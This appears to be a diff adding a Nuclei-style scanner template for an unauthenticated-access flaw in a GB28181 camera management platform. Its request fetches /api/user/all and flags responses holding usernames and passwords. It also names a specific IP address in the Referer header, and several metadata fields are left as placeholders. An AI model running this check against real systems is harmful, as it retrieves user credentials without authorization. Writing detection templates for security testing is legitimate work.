@@ -1,0 +1,31 @@
+id: GB28181-user-weak
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: GB28181摄像头管理平台未授权访问漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /api/user/all HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Referer: http://36.48.50.13:3000/
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - password
+      - type: word
+        part: body
+        words:
+          - username
